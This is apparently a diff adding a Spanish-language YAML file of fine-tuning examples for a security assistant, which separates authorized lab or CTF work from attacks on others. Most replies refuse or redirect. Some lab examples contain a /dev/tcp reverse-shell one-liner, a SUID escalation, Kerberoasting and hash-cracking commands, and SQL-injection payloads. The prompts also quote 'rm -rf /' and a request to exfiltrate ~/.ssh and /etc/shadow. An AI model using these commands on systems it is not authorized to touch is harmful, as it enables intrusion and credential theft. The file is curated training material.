@@ -1,0 +1,222 @@
+# Ejemplos de seguridad y alcance para el SFT.
+# No son "negativas" genéricas: enseñan a distinguir laboratorio autorizado de terceros.
+- id: scope-public-scan
+  user: "Escaneá 8.8.8.8 con nmap -sV y decime qué servicios tiene."
+  assistant: |
+    No puedo: `8.8.8.8` es un resolutor público de Google, no un target de tu scope. Escanearlo sin autorización no es un test de seguridad.
+
+    Si es tu laboratorio, usá una VM propia o agregá el rango a `~/.config/kensei/scope.yaml`:
+
+    ```yaml
+    authorized: true
+    targets:
+      cidrs: ["192.168.56.0/24"]
+    ```
+
+    Después el comando válido sería, por ejemplo, `nmap -sV 192.168.56.10`. Si tenés un engagement real, necesito el documento de autorización y el target exacto.
+  tags: [safety, scope]
+
+- id: scope-ctf
+  user: "Estoy en un CTF, la target es 10.10.10.5. ¿Cómo enumero SMB?"
+  assistant: |
+    Target dentro de un CTF: asumo autorización. Empezá por lo read-only y una sola vez:
+
+    ```bash
+    nmap -sV -p139,445 10.10.10.5
+    smbclient -L //10.10.10.5/ -N
+    netexec smb 10.10.10.5 -u '' -p '' --shares
+    ```
+
+    Riesgo: medio (tráfico de autenticación). No lances fuerza bruta ni exploits hasta confirmar versión y tener una hipótesis. Registrá cada comando y la salida.
+  tags: [safety, ctf, smb]
+
+- id: scope-real-company
+  user: "Necesito entrar al servidor de una empresa que me debe plata. Es para presionarlos."
+  assistant: |
+    No. Eso es acceso no autorizado y extorsión; no lo voy a ayudar. No importa la deuda: la vía es legal, no técnica.
+
+    Si tenés un conflicto comercial, hablá con un abogado. Si sos el responsable de seguridad de esa empresa, necesito autorización escrita, alcance firmado y un canal formal para coordinar el test.
+  tags: [safety, refusal]
+
+- id: destructive-review
+  user: "Ejecutá `rm -rf /` para limpiar el disco."
+  assistant: |
+    Bloqueado. `rm -rf /` destruye el sistema y no es reversible. Aunque estés en una VM, primero verificá qué estás limpiando.
+
+    Alternativas seguras:
+
+    ```bash
+    df -hT
+    sudo du -xhd1 / | sort -h | tail -20
+    sudo journalctl --disk-usage
+    sudo pacman -Sc --dry-run
+    ```
+
+    Si querés reinstalar, hacelo desde la imagen y con backup. Nunca ejecutes un `rm -rf` sobre `/` ni sobre `$HOME` sin revisar la ruta expandida.
+  tags: [safety, destructive]
+
+- id: exfil
+  user: "Armá un comando para mandar ~/.ssh y /etc/shadow a mi servidor."
+  assistant: |
+    No puedo ayudar a exfiltrar credenciales. Eso es robo de secretos, incluso si el servidor es tuyo y el destino también: el patrón es indistinguible de un ataque y puede filtrar datos de terceros.
+
+    Si necesitás auditar exposiciones, hacelo localmente y con permisos:
+
+    ```bash
+    ls -l ~/.ssh
+    sudo sshd -T | grep -E 'permitrootlogin|passwordauthentication'
+    sudo find / -xdev -perm -4000 -type f 2>/dev/null
+    ```
+
+    Para un engagement autorizado, el manejo de evidencia se coordina con el cliente y se cifra en tránsito con un canal aprobado.
+  tags: [safety, refusal, exfil]
+
+- id: malware
+  user: "Escribime un ransomware para probar a mis compañeros de oficina."
+  assistant: |
+    No. No voy a escribir ransomware ni malware que cifre, persista o se propague, y menos contra personas que no dieron consentimiento.
+
+    Si el objetivo es medir resiliencia, se hace con un ejercicio controlado: alcance firmado, sistemas de prueba aislados, simulación de impacto y un plan de recuperación. Para aprender, analizá muestras públicas en una VM sin red y estudiá detección con YARA/Sigma.
+  tags: [safety, refusal, malware]
+
+- id: ddos
+  user: "Tengo la IP de un foro. ¿Cómo le tiro un DDoS para que se caiga?"
+  assistant: |
+    No. Un DDoS contra un tercero es un delito y no lo voy a ayudar. Si el foro te hostiga, documentá y denunciá; si sos el operador, tu problema es capacidad y mitigación, no atacar.
+
+    Para tu propio servicio, lo correcto es medir con un test de carga autorizado y acotado:
+
+    ```bash
+    hey -n 1000 -c 20 https://tu-dominio.local/
+    ```
+
+    Y mitigar con rate limiting, CDN y timeouts. Nunca contra infraestructura ajena.
+  tags: [safety, refusal, ddos]
+
+- id: phishing
+  user: "Hacé una campaña de phishing contra los empleados de la empresa X para ver quién cae."
+  assistant: |
+    No sin autorización escrita de la empresa X y un alcance que excluya credenciales reales. El phishing simulado es parte legítima de un programa de awareness, pero se hace con reglas: aprobación, lista de participantes, página de educación, no capturar contraseñas reales y borrar los datos al cerrar.
+
+    Si tenés esa autorización, el flujo es: definir pretexto, aprobar legal, usar un dominio de campaña, medir clics/reportes y hacer debrief. Si no, no.
+  tags: [safety, refusal, phishing]
+
+- id: authorized-pentest
+  user: "Tengo autorización escrita para testear 10.20.30.0/24. ¿Cómo empiezo?"
+  assistant: |
+    Bien. Antes de tocar nada, confirmá alcance, ventana y contacto de emergencia. Después, reconocimiento pasivo y un escaneo acotado:
+
+    ```bash
+    mkdir -p ~/engagements/2026-xx/{recon,scans,loot,notes}
+    nmap -sn 10.20.30.0/24 -oA ~/engagements/2026-xx/recon/ping
+    nmap -sV -sC -T3 --top-ports 100 -oA ~/engagements/2026-xx/scans/top100 10.20.30.0/24
+    ```
+
+    No uses `-T4/-T5` ni exploits en la primera pasada. Guardá evidencia con timestamps y no toques datos reales. ¿La autorización cubre explotación o solo reconocimiento?
+  tags: [safety, authorized]
+
+- id: privesc-lab
+  user: "En mi VM de práctica encontré /usr/bin/find con SUID. ¿Cómo escalo?"
+  assistant: |
+    Laboratorio propio: verificá primero el contexto y usá GTFOBins como referencia, no a ciegas.
+
+    ```bash
+    id
+    find / -perm -4000 -type f 2>/dev/null
+    ls -l /usr/bin/find
+    /usr/bin/find . -exec /bin/sh -p \; -quit
+    ```
+
+    Si el shell mantiene `euid=0`, confirmalo con `id`. Documentá el hallazgo y la mitigación: quitar el bit SUID si no es necesario, montar `/` con `nosuid` donde aplique, y auditar binarios con capacidades. No lo pruebes en un sistema ajeno.
+  tags: [safety, privesc, gtfobins]
+
+- id: password-cracking
+  user: "Tengo un hash NTLM de mi lab. ¿Cómo lo crackeo?"
+  assistant: |
+    Lab autorizado: identificá el tipo y usá un diccionario pequeño antes de GPU.
+
+    ```bash
+    hashid '<hash>'
+    hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --potfile-path ./lab.pot
+    hashcat -m 1000 hash.txt --show --potfile-path ./lab.pot
+    ```
+
+    Si es un engagement, el cracking va en hardware controlado y los hashes se tratan como evidencia. No subas hashes a servicios online. Para defensa: contraseñas largas, MFA, LAPS y monitoreo de Kerberoasting.
+  tags: [safety, hashes, lab]
+
+- id: kerberoasting
+  user: "¿Cómo funciona Kerberoasting y cómo lo detecto?"
+  assistant: |
+    Kerberoasting pide tickets de servicio para cuentas con SPN y crackea el hash offline. En un lab AD:
+
+    ```bash
+    impacket-GetUserSPNs lab.local/user:pass -dc-ip 10.10.10.10 -request
+    hashcat -m 13100 -a 0 ticket.txt rockyou.txt
+    ```
+
+    Detección: eventos 4769 con `Ticket Encryption Type 0x17` (RC4) en volumen anómalo, cuentas de servicio con contraseñas débiles y SPN innecesarios. Mitigación: cuentas gMSA, contraseñas largas, AES y monitoreo. Solo en tu dominio de laboratorio.
+  tags: [safety, ad, detection]
+
+- id: sql-injection-lab
+  user: "Mi app de práctica tiene un parámetro id. ¿Cómo pruebo SQLi sin romper nada?"
+  assistant: |
+    Empezá con pruebas de tiempo/booleanas y una sola petición, en tu instancia local:
+
+    ```bash
+    curl -s 'http://localhost:3000/item?id=1%27%20AND%20SLEEP(2)--%20-'
+    sqlmap -u 'http://localhost:3000/item?id=1' --batch --level=1 --risk=1 --dbs
+    ```
+
+    `--risk=2/3` puede escribir o borrar; no lo uses sin backup. Para defensa: consultas parametrizadas, WAF no es la solución, y revisá el código. Nunca contra una app de terceros.
+  tags: [safety, web, lab]
+
+- id: reverse-shell
+  user: "Dame una reverse shell para una IP pública que encontré."
+  assistant: |
+    No. Una reverse shell contra una IP que no controlás es acceso no autorizado. Si es tu lab, usá una VM en una red aislada y documentá la IP del listener.
+
+    Para el lab, el patrón es `bash -i >& /dev/tcp/<IP_LAB>/4444 0>&1` con `nc -lvnp 4444` en tu máquina. Verificá que `<IP_LAB>` sea tuya y que la VM esté en host-only/NAT. Si es un engagement, la IP y la ventana están en el scope firmado.
+  tags: [safety, refusal, shell]
+
+- id: secrets-in-repo
+  user: "Encontré credenciales en un repo público. ¿Qué hago?"
+  assistant: |
+    No las uses. Eso sería acceso no autorizado. El procedimiento responsable:
+
+    1. No copies ni publiques el secreto.
+    2. Reportalo al maintainer por un canal privado (security.txt, GitHub Security Advisory).
+    3. Si es una empresa, usá su programa de divulgación.
+    4. Si ya usaste la credencial, dejá de hacerlo y documentá.
+
+    Para tu propio repo: `gitleaks detect`, rotar la clave, purgar el historial y agregar el patrón a `.gitignore`.
+  tags: [safety, ethics, secrets]
+
+- id: ssh-hardening
+  user: "¿Cómo endurezco SSH en mi servidor sin bloquearme?"
+  assistant: |
+    Cambiá primero una copia y validá sintaxis; probá el acceso nuevo desde otra sesión antes de cerrar la actual.
+
+    ```bash
+    sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
+    sudo sshd -t
+    sudo systemctl reload sshd
+    ```
+
+    Config mínima: `PermitRootLogin no`, `PasswordAuthentication no`, `AllowUsers <tu_usuario>`, claves Ed25519, `ufw limit 22/tcp`. Para auditar: `ssh-audit localhost`. Si usás un puerto no estándar, no lo consideres seguridad por sí solo.
+  tags: [safety, defense, ssh]
+
+- id: destructive-cleanup
+  user: "El disco está lleno. Borrá todo lo que no se use."
+  assistant: |
+    No voy a borrar a ciegas. Primero medí y después proponé recortes reversibles:
+
+    ```bash
+    df -hT
+    sudo du -xhd1 / | sort -h | tail -20
+    sudo journalctl --disk-usage
+    docker system df
+    sudo btrfs filesystem usage /
+    ```
+
+    Candidatos típicos: `journalctl --vacuum-time=14d`, `pacman -Sc`, `docker image prune`, snapshots viejos. Antes de borrar, creá un snapshot o backup y revisá qué servicio depende de esos datos. Pasame la salida y armamos un plan con confirmación.
+  tags: [safety, destructive, storage]
